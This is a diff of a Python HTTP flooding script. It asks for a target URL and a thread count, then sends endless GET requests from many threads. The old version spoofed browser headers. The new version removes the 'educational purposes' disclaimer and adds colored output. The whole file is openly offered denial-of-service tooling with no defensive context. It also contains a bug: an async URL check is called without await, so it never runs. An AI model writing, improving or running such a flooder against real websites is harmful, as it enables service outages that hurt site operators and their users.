@@ -1,41 +1,46 @@
 """
-Made by igna#0911 | Made for educational purposes
+Made by igna#0911 | https://github.com/uhIgnacio
 """
 import requests, threading, os
+from colorama import Fore, init
 
-url = input("[+] Enter the URL: ")
+# Main
+init(convert=True)
+os.system("cls")
+counter = 0
 
+# Input
+url = input(Fore.LIGHTMAGENTA_EX + "[x] Enter URL: ")
+amount = input(Fore.LIGHTMAGENTA_EX + "[x] Enter Threads Amount: ")
 
-class Flooder:
-    def __init__(self):
-        self.session = requests.Session()
-        self.headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Content-Type": "application/json",
-            "Connection": "keep-alive",
-            "Referer": "https://google.com",
-            "Pragma": "no-cache",
-            "Cache-Control": "no-cache",
-        }
-
-    def Flood(self):
-        count = 0
-        while True:
-            try:
-                self.session.get(url, headers=self.headers)
-                count += 1
-                print(f"[+] {count} requests sent")
-            except:
-                pass
-
-
-if __name__ == "__main__":
+# Check URL is valid
+async def check():
     try:
-        for x in range(int(input("[+] Enter the amount of threads: "))):
-            threading.Thread(target=Flooder().Flood).start()
-    except KeyboardInterrupt:
-        print("[+] Exiting...")
-        exit()
+        r = requests.get(url)
+        if r.status_code == 200 or r.status_code == 301 or r.status_code == 302:
+            print(Fore.LIGHTGREEN_EX + "[+] URL is valid")
+            print(Fore.LIGHTGREEN_EX + f"Starting to flood with {amount} threads...")
+        else:
+            print(Fore.LIGHTRED_EX + "[-] URL is invalid")
+            exit()
+    except Exception as e:
+            print(Fore.LIGHTRED_EX + f"[-] Error | {e}")
+
+# Start Flooding
+def Flood():
+    global counter
+    check()
+    while True:
+        try:
+            requests.get(url)
+            counter += 1
+            print(Fore.LIGHTGREEN_EX + f"[+] {counter} requests sent!...")
+        except Exception as e:
+            print(Fore.LIGHTRED_EX + f"[-] Error | {e}!")
+            exit()
+
+
+# Start Threads
+for _ in range(int(amount)):
+    t = threading.Thread(target=Flood)
+    t.start()
